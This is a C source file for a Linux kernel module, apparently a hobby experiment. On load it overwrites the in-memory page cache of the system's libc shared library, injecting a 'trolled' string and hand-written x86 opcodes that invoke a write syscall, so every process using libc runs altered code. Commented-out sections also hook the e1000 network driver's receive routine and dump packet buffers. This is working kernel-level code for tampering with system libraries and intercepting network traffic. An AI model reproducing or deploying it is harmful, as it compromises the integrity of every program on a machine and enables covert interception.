#include "taskutil.h"
#include "memutil.h"
#include "depend.h"
#include "address_space.h"
#include "networking.h"
#include "e1000.h"
#include "e1000_hw.h"
#include "e1000_osdep.h"
#ifndef VICTIM_FILE
#define VICTIM_FILE "/lib/x86_64-linux-gnu/libc-2.33.so"
#endif

const char* net_adapter = "e1000";

#define VICTIM_FILE_OVERRIDE "/lib/x86_64-linux-gnu/libc-2.33.so"

#define STRINGIFY(A) #A
#define TOSTRING(A) STRINGIFY(A) //I don't why the fuck this works. If I had to take a guess, it is because when you pass in A in TOSTRING, you pass in the value of A which is then stringifyed.

const char* troll = "trolled";

struct inode* i;
struct page* old_opcode;
struct page* new_opcode;
struct page* old_troll;
struct page* new_troll;

struct e1000_adapter* e1000;

bool (*old_clean_rx)(struct e1000_adapter* adapter, struct e1000_rx_ring* rx_ring, int* work_done, int work_to_do);


bool new_clean_rx(struct e1000_adapter* adapter, struct e1000_rx_ring* rx_ring, int* work_done, int work_to_do){
  return old_clean_rx(adapter, rx_ring, work_done, work_to_do); //LULW
}

char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x10, 0x94, 0x08, 0x00, 0x48, 0xC7, 0xC2, 0x08, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00 }  ; //append with a shit ton of nops
int init_module(void)
{
  
  printk(KERN_INFO "Printing out pci devices\n");
  char* path = VICTIM_FILE_OVERRIDE;
  i = get_file_path(path);//
  if(!i){
    printk(KERN_INFO "Invalid path\n");
    return 0;
  }
  printk(KERN_INFO "Path Succeeded\n");

  if(i -> i_mapping == NULL){
    printk(KERN_INFO "This page does not have an address_space object - it is likely not file-mapped\n");
    return 0;
  }
  printk(KERN_INFO "This page has an address_space object - it is likely file-mapped\n");

  //fuckery(i, 0x00191027);

  //unmap_page(i, 0x00107c10);
  write_string_page_cache(i, 0x00191027, troll, 8, &new_troll, &old_troll);
  write_string_page_cache(i, 0x00107c10, trolling_opcodes, 21, &new_opcode, &old_opcode);
  

  if(old_troll){
    printk(KERN_INFO "old_troll refcount: %d\n", page_ref_count(old_troll));
    printk(KERN_INFO "old_troll mapcount: %d\n", atomic_read(&old_troll -> _mapcount));
  }else{
    printk(KERN_INFO "old_troll is null\n");
  }

  if(new_troll){
    printk(KERN_INFO "new_troll refcount: %d\n", page_ref_count(new_troll));
    printk(KERN_INFO "new_troll mapcount: %d\n", atomic_read(&new_troll -> _mapcount));
  }else{
    printk(KERN_INFO "new_troll is null\n");
  }


  if(old_opcode){
    printk(KERN_INFO "old_opcode refcount: %d\n", page_ref_count(old_opcode));
    printk(KERN_INFO "old_opcode mapcount: %d\n", atomic_read(&old_opcode -> _mapcount));
  }else{
    printk(KERN_INFO "old_opcode is null\n");
  }

  if(new_opcode){
    printk(KERN_INFO "new_opcode refcount: %d\n", page_ref_count(new_opcode));
    printk(KERN_INFO "new_opcode mapcount: %d\n", atomic_read(&new_opcode -> _mapcount));
  }else{
    printk(KERN_INFO "new_opcode is null\n");
  }

  



  //remove_page(i, 0x00107c10); //extraction confirmed
  //remove_page(i, 0x00191027);











  //enumerate_pci();
  //printk(KERN_INFO "%lx\n", (unsigned long)net_adapter);
  //printk(KERN_INFO "%s\n", net_adapter);
  /*struct pci_dev* pd = find_pci(net_adapter, 5);
  
  if(pd){
    printk("pci name: %s\n", get_dev_name(pd));
  }else{
    printk(KERN_INFO "Couldn't find a pci device with name %s\n", net_adapter);
    return 0;
  }
  int irq = pd->irq;
  //disable_irq(irq);
  struct net_device* nd = get_net_dev(pd);
  printk(KERN_INFO "%s\n", get_dev_name(pd));
  if(!nd){
    printk(KERN_INFO "Couldn't find net_device. This is likely not a net device\n");
    return 0;//printk(KERN_INFO "tx queue len:%d\n", nd->tx_queue_len);
  }


  printk("MTU: %u\n", nd -> mtu);
  e1000 = get_e1000_adapter(nd);
  
  if(!e1000){
    printk(KERN_INFO "Couldn't find e1000 adapter");
    return 0;
  }


  old_clean_rx = e1000->clean_rx; //save old clean_rx
  
  e1000->clean_rx = new_clean_rx; //add new, shitty clean_rx*/

  /*if(e1000 -> pdev == pd && e1000 -> netdev == nd){
    printk(KERN_INFO "This is indeed the e1000\n");
  }else{
    printk(KERN_INFO "This is not the e1000\n");
    return 0;
  }
  struct e1000_rx_ring* rx_ring= e1000->rx_ring;
  
  if(!rx_ring){
    printk(KERN_INFO "Not a valid rx ring\n");
    return 0;
  }

  //e1000_dump(e1000);
  int j;
  
    
   // This code is diagnositc code copied from line #3446 in e1000_main.c on the latest version of the linux kernel
    
  struct e1000_rx_desc *rx_desc = E1000_RX_DESC(*rx_ring, rx_ring->next_to_clean);
	struct e1000_rx_buffer *buffer_info = &rx_ring->buffer_info[rx_ring->next_to_clean];

	
    pr_info("Current NTU: %d\n", rx_ring->next_to_use);
    for(j = 0; j<E1000_RXBUFFER_2048; j++){
      pr_info("%c\n", *((char*)(buffer_info->rxbuf.data + NET_SKB_PAD + NET_IP_ALIGN + j))); //i have no fucking clue what this does
    }*/
    



  return 0;
}
void cleanup_module(void)
{
  //replace_page(new_opcode, old_opcode);
  //replace_page(new_troll, old_troll); //flipped around because
  

  /*if(!old_opcode){
    printk(KERN_INFO "Old opcode has been evicted\n");
  }

  if(!old_troll){
    printk(KERN_INFO "Old troll has been evicted\n");
  }*/

  
  
  remove_page(i, 0x00107c10); //extraction confirmed
  remove_page(i, 0x00191027);


	printk("Module cleanup\n");
}
MODULE_LICENSE("GPL");
  